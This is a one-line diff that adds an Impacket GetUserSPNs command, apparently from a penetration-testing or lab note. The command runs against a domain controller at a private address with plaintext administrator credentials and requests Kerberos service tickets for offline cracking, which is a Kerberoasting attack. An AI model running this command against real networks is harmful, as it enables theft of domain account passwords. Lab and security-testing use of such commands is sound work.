@@ -1,0 +1,1 @@
+impacket-GetUserSPNs corp/administrator:admin@123 -dc-ip 192.168.65.10 -request
